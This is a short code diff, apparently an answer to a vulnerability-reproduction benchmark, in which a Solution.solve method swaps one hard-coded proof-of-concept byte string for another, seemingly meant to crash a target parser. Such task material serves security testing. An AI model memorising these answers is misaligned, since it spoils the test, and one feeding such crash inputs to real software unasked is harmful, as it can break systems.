@@ -1,4 +1,4 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b'\x10\x10\x00\x80\x00\x21\x00\x00\x00\x01\x00\x00\x00\x01\x00\x20' + b'\x00' * 17
+        poc = b'\x02\x20\x00\x40\x00\x00\x00\x00' + b'\x00' * 25
         return poc
